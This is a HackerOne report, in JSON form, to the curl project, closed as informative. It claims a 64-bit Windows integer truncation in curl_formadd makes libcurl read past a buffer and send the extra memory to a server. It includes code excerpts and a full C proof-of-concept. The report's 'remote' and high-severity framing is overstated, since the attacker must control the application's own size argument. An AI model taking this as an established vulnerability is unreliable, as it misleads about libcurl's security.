{
  "id": 1444539,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDQ0NTM5",
  "url": "https://hackerone.com/reports/1444539",
  "title": " Remote memory disclosure vulnerability in libcurl on 64 Bit Windows",
  "state": "Closed",
  "substate": "informative",
  "severity_rating": "high",
  "readable_substate": "Informative",
  "created_at": "2022-01-09T15:24:59.000Z",
  "submitted_at": "2022-01-09T15:24:59.101Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "nsq11",
    "url": "/nsq11",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35663,
    "url": "https://hackerone.com/curl",
    "handle": "curl",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "curl",
      "twitter_handle": "",
      "website": "https://curl.se",
      "about": "cURL is an Open Source project providing a library and command-line tool for doing internet transfers"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-02-21T09:15:57.017Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2022-01-13T22:07:26.643Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "# Remote memory disclosure vulnerability in libcurl on 64 Bit Windows\n\n## Summary:\n\n`libcurl` (latest) contains a vulnerability that enables attackers to\nremotely read memory beyond the bounds of a buffer in the style of the\ninfamous \"heartbleed\" vulnerability. Luckily, however, this is only\npossible when `libcurl` runs on 64 bit Windows and it requires an\nattacker capable of influencing the size of a file upload part.\n\nThe core of the problem is the following: while on 64 Linux and BSD\nsystems, `sizeof(long)` is 8, on 64 bit Windows, it\nis 4. Consequently, the function `AddHttpPost` carries out an integer\ntruncation and sign conversion on these systems, as the parameter\n`bufferlength` of type `size_t` (8 byte wide, unsigned) is assigned to\nthe field `post->bufferlength` of type `long` (4 byte wide,\nsigned). The following excerpt shows the corresponding code:\n\n\n```\nstatic struct curl_httppost *\nAddHttpPost(char *name, size_t namelength,\n            char *value, curl_off_t contentslength,\n            char *buffer, size_t bufferlength,\n\t        [...]\n            struct curl_httppost **last_post)\n{\n\t[...]\n    post->buffer = buffer;\n    post->bufferlength = (long)bufferlength; /* <=== */ \n\t[...]\n}\n```\n\nIn particular, this function is triggered when constructing an HTTP\nPOST request that specifies custom file upload parts, e.g., with a\nstatement such as the following:\n\n```\ncurl_formadd(&formpost,\n             &lastptr,\n             CURLFORM_COPYNAME, \"name\",\n             CURLFORM_BUFFER, \"data\",\n             CURLFORM_BUFFERPTR, buffer,\n             CURLFORM_BUFFERLENGTH, size,\n             CURLFORM_END);\n```\n\nAn attacker capable of choosing the file to upload may choose for it\nto be 4294967295 in size, and, indeed, `libcurl` will transfer this\nfile without trouble on 64 bit Linux. On 64 bit Windows, however, this\nleads to `post->bufferlength` being -1 due to the\ntruncation/sign-conversion, which happens to also be the value of the\nconstant `CURL_ZERO_TERMINATED`. On posting the data, this undesirable\ninterpretation causes the function `curl_mime_data` to assume that the\nlength of the buffer to upload is not known and should be determined\nvia `strlen`. Assuming the buffer does not contain zero bytes - and in\nfact, the documentation states that it MAY NOT contain zero bytes,\n`strlen` will read beyond the bounds of the buffer `buffer`, and\nsubsequently transmit the buffer contents AND memory behind it to the\nHTTP server.\n\nThe following (commented) excerpt of `curl_mime_data` illustrates this\nbehavior:\n\n```\nCURLcode curl_mime_data(curl_mimepart *part, /* <=== */ \n                        const char *data, size_t datasize)\n{\n   [...]\n\n  if(data) {\n    // This branch is triggered when `datasize` is -1,\n\t// Note that `datasize` is again `size_t`, so, it will\n\t// then be > 2**32-1.\n    if(datasize == CURL_ZERO_TERMINATED)\n      datasize = strlen(data);\n\n\t// With a system that has > 4GB RAM, this allocation\n\t// succeeds.\n    part->data = malloc(datasize + 1);\n    if(!part->data)\n      return CURLE_OUT_OF_MEMORY;\n\n\t// The part size is now set to be larger than 2**32-1,\n\t// although 2**32-1 is the size of the file. \n    part->datasize = datasize;\n\n```\n\n## Steps To Reproduce:\n\nTo further illustrate the problem, I have created a sample application\nfor which the string \"secret\" is located directly after the\nto-be-transmitted buffer. On 64 bit Linux, the program correctly\ntransmits only the contents of the buffer. On 64 bit Windows, it\ntransmits the buffer contents and the string \"secret\". Logging network\ntraffic using `tcpdump`, this has been confirmed as the attached\nscreenshots show.\n\nThe following is the sample program (test.c), which compiles both on Linux\nand Windows (Visual Studio 2022 Community Edition).\n\n```\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <curl/curl.h>\n\nint main(void)\n{\n    CURL* curl;\n    CURLM* multi_handle;\n    int still_running = 0;\n    struct curl_httppost* formpost = NULL;\n    struct curl_httppost* lastptr = NULL;\n    struct curl_slist* headerlist = NULL;\n    static const char buf[] = \"Expect:\";\n\n    // Place 4294967295 'A's on the heap (the buffer to transmit),\n    // followed by the string \"secret\". If we now instruct libcurl\n    // to transfer 4294967295, it should only transfer 'A's.\n    \n    size_t size = (size_t) 0xffffffff;\n    char* buffer = (char*)malloc(size + strlen(\"secret\") + 1);    \n    memset(buffer, 'A', size);    \n    memcpy(buffer + size, \"secret\", strlen(\"secret\"));\n    buffer[size + strlen(\"secret\")] = '\\0';\n\n    // Instruct curl to send the buffer, specifying its size\n    // to be 4294967295 (size)\n    \n    int ret = curl_formadd(&formpost,\n        &lastptr,\n        CURLFORM_COPYNAME, \"name\",\n        CURLFORM_BUFFER, \"data\",\n        CURLFORM_BUFFERPTR, buffer,\n        CURLFORM_BUFFERLENGTH, size,\n        CURLFORM_END);\n\n    // The return value is 0 (success)\n    printf(\"%d\\n\", ret);\n    \n    curl = curl_easy_init();\n    multi_handle = curl_multi_init();    \n    headerlist = curl_slist_append(headerlist, buf);\n    if (curl && multi_handle) {\n      // We are uploading to a local webserver, but this can be any webserver.\n      // upload.cgi can be an empty file.\n      curl_easy_setopt(curl, CURLOPT_URL, \"http://192.168.1.216/upload.cgi\");\n      curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);\n      curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);\n      curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);      \n      curl_multi_add_handle(multi_handle, curl);      \n      do {\n            CURLMcode mc = curl_multi_perform(multi_handle, &still_running);\t    \n            if (still_running)\n\t      /* wait for activity, timeout or \"nothing\" */\n\t      mc = curl_multi_poll(multi_handle, NULL, 0, 1000, NULL);\t    \n            if (mc)\n\t      break;\t    \n      } while (still_running);      \n      curl_multi_cleanup(multi_handle);\n      curl_easy_cleanup(curl);\n      curl_formfree(formpost);\n      curl_slist_free_all(headerlist);\n    }\n    return 0;\n}\n```\n\nAs suggested patch would be to use the type `long long` as opposed to\n`long` for the buffer length. `long long` is guaranteed to be 8 byte\nwide on Linux and Windows 64 bit systems.\n\n## Impact\n\nAn attacker could read memory from the process remotely, meaning that any information processed by the program using libcurl may be disclosed. Depending on the application, this information may be sensitive, e.g., passwords, keys could be in memory. In addition, reading memory offsets may be useful to identify memory mappings remotely in preparation for a memory corruption exploits that requires bypassing of ASLR.",
  "weakness": {
    "id": 113,
    "name": "Information Exposure Through Sent Data"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1573103,
      "file_name": "screenshot-linux.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dl88uqdo51ruemqmgyt8m7zap2ik?response-content-disposition=attachment%3B%20filename%3D%22screenshot-linux.png%22%3B%20filename%2A%3DUTF-8%27%27screenshot-linux.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXDXMWQX4%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142134Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBXiIatSvXxAR8ZBwoq9n9qamV3%2Beh4VxZ3KYO4Dx8ipAiBhqaPFcz1fCY4UiwnoQpCKbjkuyniJ5UnHxhrd1V7sPCqxBQh2EAMaDDAxMzYxOTI3NDg0OSIMI7x1nUgRkEN0qOmcKo4FXYYyeBqpZepmBlG%2Bn8RIW4ybBvBDLTs5NzQS7p452M4cH8%2FOy1nnGTSEGOnFuQ1hr8I838Py4bbR2k0%2FeAXwEKBwp9kUx1f6xHqwuZ%2BZJE6IBIkxerlv%2FE3eoTBjleGGo2wwfiOgBypgZ5sXatzcXx72vmVtwhxsDHzFmuJonyOALDBbiuqGbIPREpmA3jUxq%2BMAacTvuf9XMxNE478SaHCKprf1SFobf84oc7fT%2FWNU4UeJ8GNMQeSenAKYY%2BrLefa1UY4wwj6g5D0GjwCVp9bHXI21rt%2BOchx%2BJy%2Ff8hhrWt2fFEziDHK2ejHlzmon20KSav3Ecka%2Fl7q%2FXbFq%2B5cHQ3Fnv6Hsuz%2BtzfIL4EI8nN4PTXJ959QXCgSq68M3r%2FCq038IGGPaf9q5IZ44XiRhpk9WyrUqaUvKDpIG2kZMpC6jLDCikWY%2F0pq0aLMVs8K3zMuHvUvoA%2B2gV%2Bcm6EdoBU1pM0KqEZ4gTsmJdr8mPFqfdK1P4IwECSvHVNNvRZ%2FytigAMyryjJi%2FzrEs38Y9%2FrEkIQq4jS7aMXa2dJvo8qo%2BMpwzgI63Zc9%2BUb7QMMj32n1iEhgvRp0P4HsvjBZW5a45NrCNrdPawRXUjURzopS4c1KkPmoIyqVJLA%2FcZfSuGhSIBnYcB3irx3ar6nXnb1BlJQeYwVq%2BGugPDwYF7JnE98PVLlThTxxkQLe6rmhG98KDMqkM2rSCOaoIoCAr8pyrGNylV531TI6WsbwObHBBin8dGaMs5bPKof2pfOiufJXYwPbUfatl0yR4eeNEDZ2ojVwsNt%2FXz0I%2BnOHi3gFnlaTXXL2pE75y8B8i2gdpWyljLCB%2Bnh8JAX4zJ9W5uSJwboRkdOBCbm1EMOnJra4GOrIBAGTU0E8gZ3I1JcYpghGRH630deXcWBT7WyMmozUTe6qarc28Ss1LWSuryHkoMrH7Sud0DqGFERBVj7YzRXPoLL7BGEhCuNa2uCE2kvLJYBOVb8O0U%2BA8CX4iNwz55KlL7rByi1vNt6ahpUI7DJZTOvkkTX1DSVfQF%2Baicg%2BfMtGKT4Z2J8HGmzqC%2FR%2FqkC6K2vyecQNgl1yG%2BNZWxHLH3sMFQGgXVbyipFgwNo8D0TTcrQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d142b07231ce25a2d03837cb66d794a87185d34f0beaa2de6dd1b1a6378de62a",
      "file_size": 22734,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1573104,
      "file_name": "screenshot-win.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/a1vkczon7u5l6wwnutba02bj2yox?response-content-disposition=attachment%3B%20filename%3D%22screenshot-win.png%22%3B%20filename%2A%3DUTF-8%27%27screenshot-win.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXDXMWQX4%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142134Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBXiIatSvXxAR8ZBwoq9n9qamV3%2Beh4VxZ3KYO4Dx8ipAiBhqaPFcz1fCY4UiwnoQpCKbjkuyniJ5UnHxhrd1V7sPCqxBQh2EAMaDDAxMzYxOTI3NDg0OSIMI7x1nUgRkEN0qOmcKo4FXYYyeBqpZepmBlG%2Bn8RIW4ybBvBDLTs5NzQS7p452M4cH8%2FOy1nnGTSEGOnFuQ1hr8I838Py4bbR2k0%2FeAXwEKBwp9kUx1f6xHqwuZ%2BZJE6IBIkxerlv%2FE3eoTBjleGGo2wwfiOgBypgZ5sXatzcXx72vmVtwhxsDHzFmuJonyOALDBbiuqGbIPREpmA3jUxq%2BMAacTvuf9XMxNE478SaHCKprf1SFobf84oc7fT%2FWNU4UeJ8GNMQeSenAKYY%2BrLefa1UY4wwj6g5D0GjwCVp9bHXI21rt%2BOchx%2BJy%2Ff8hhrWt2fFEziDHK2ejHlzmon20KSav3Ecka%2Fl7q%2FXbFq%2B5cHQ3Fnv6Hsuz%2BtzfIL4EI8nN4PTXJ959QXCgSq68M3r%2FCq038IGGPaf9q5IZ44XiRhpk9WyrUqaUvKDpIG2kZMpC6jLDCikWY%2F0pq0aLMVs8K3zMuHvUvoA%2B2gV%2Bcm6EdoBU1pM0KqEZ4gTsmJdr8mPFqfdK1P4IwECSvHVNNvRZ%2FytigAMyryjJi%2FzrEs38Y9%2FrEkIQq4jS7aMXa2dJvo8qo%2BMpwzgI63Zc9%2BUb7QMMj32n1iEhgvRp0P4HsvjBZW5a45NrCNrdPawRXUjURzopS4c1KkPmoIyqVJLA%2FcZfSuGhSIBnYcB3irx3ar6nXnb1BlJQeYwVq%2BGugPDwYF7JnE98PVLlThTxxkQLe6rmhG98KDMqkM2rSCOaoIoCAr8pyrGNylV531TI6WsbwObHBBin8dGaMs5bPKof2pfOiufJXYwPbUfatl0yR4eeNEDZ2ojVwsNt%2FXz0I%2BnOHi3gFnlaTXXL2pE75y8B8i2gdpWyljLCB%2Bnh8JAX4zJ9W5uSJwboRkdOBCbm1EMOnJra4GOrIBAGTU0E8gZ3I1JcYpghGRH630deXcWBT7WyMmozUTe6qarc28Ss1LWSuryHkoMrH7Sud0DqGFERBVj7YzRXPoLL7BGEhCuNa2uCE2kvLJYBOVb8O0U%2BA8CX4iNwz55KlL7rByi1vNt6ahpUI7DJZTOvkkTX1DSVfQF%2Baicg%2BfMtGKT4Z2J8HGmzqC%2FR%2FqkC6K2vyecQNgl1yG%2BNZWxHLH3sMFQGgXVbyipFgwNo8D0TTcrQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=51a3b2f94f4b7c833e0b406b20f809f609ea1b537ba325f090b3a2a7b50b7155",
      "file_size": 23707,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1573105,
      "file_name": "test.c",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8qr3yahxdhyk1750pcnqr3r4hpdc?response-content-disposition=attachment%3B%20filename%3D%22test.c%22%3B%20filename%2A%3DUTF-8%27%27test.c&response-content-type=text%2Fx-csrc&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXDXMWQX4%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142134Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBXiIatSvXxAR8ZBwoq9n9qamV3%2Beh4VxZ3KYO4Dx8ipAiBhqaPFcz1fCY4UiwnoQpCKbjkuyniJ5UnHxhrd1V7sPCqxBQh2EAMaDDAxMzYxOTI3NDg0OSIMI7x1nUgRkEN0qOmcKo4FXYYyeBqpZepmBlG%2Bn8RIW4ybBvBDLTs5NzQS7p452M4cH8%2FOy1nnGTSEGOnFuQ1hr8I838Py4bbR2k0%2FeAXwEKBwp9kUx1f6xHqwuZ%2BZJE6IBIkxerlv%2FE3eoTBjleGGo2wwfiOgBypgZ5sXatzcXx72vmVtwhxsDHzFmuJonyOALDBbiuqGbIPREpmA3jUxq%2BMAacTvuf9XMxNE478SaHCKprf1SFobf84oc7fT%2FWNU4UeJ8GNMQeSenAKYY%2BrLefa1UY4wwj6g5D0GjwCVp9bHXI21rt%2BOchx%2BJy%2Ff8hhrWt2fFEziDHK2ejHlzmon20KSav3Ecka%2Fl7q%2FXbFq%2B5cHQ3Fnv6Hsuz%2BtzfIL4EI8nN4PTXJ959QXCgSq68M3r%2FCq038IGGPaf9q5IZ44XiRhpk9WyrUqaUvKDpIG2kZMpC6jLDCikWY%2F0pq0aLMVs8K3zMuHvUvoA%2B2gV%2Bcm6EdoBU1pM0KqEZ4gTsmJdr8mPFqfdK1P4IwECSvHVNNvRZ%2FytigAMyryjJi%2FzrEs38Y9%2FrEkIQq4jS7aMXa2dJvo8qo%2BMpwzgI63Zc9%2BUb7QMMj32n1iEhgvRp0P4HsvjBZW5a45NrCNrdPawRXUjURzopS4c1KkPmoIyqVJLA%2FcZfSuGhSIBnYcB3irx3ar6nXnb1BlJQeYwVq%2BGugPDwYF7JnE98PVLlThTxxkQLe6rmhG98KDMqkM2rSCOaoIoCAr8pyrGNylV531TI6WsbwObHBBin8dGaMs5bPKof2pfOiufJXYwPbUfatl0yR4eeNEDZ2ojVwsNt%2FXz0I%2BnOHi3gFnlaTXXL2pE75y8B8i2gdpWyljLCB%2Bnh8JAX4zJ9W5uSJwboRkdOBCbm1EMOnJra4GOrIBAGTU0E8gZ3I1JcYpghGRH630deXcWBT7WyMmozUTe6qarc28Ss1LWSuryHkoMrH7Sud0DqGFERBVj7YzRXPoLL7BGEhCuNa2uCE2kvLJYBOVb8O0U%2BA8CX4iNwz55KlL7rByi1vNt6ahpUI7DJZTOvkkTX1DSVfQF%2Baicg%2BfMtGKT4Z2J8HGmzqC%2FR%2FqkC6K2vyecQNgl1yG%2BNZWxHLH3sMFQGgXVbyipFgwNo8D0TTcrQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=694cb6780789e0aee4e0a3e3a01da5f768e1ae442790a357af7ce576ab64f3ff",
      "file_size": 2237,
      "type": "text/x-csrc",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 5,
  "voters": [
    "at0mq1",
    "ibring",
    "palakmahipal",
    "h4x0r_dz",
    "khizer47"
  ],
  "severity": {
    "rating": "high",
    "score": 7.7,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 18844,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/curl/curl",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
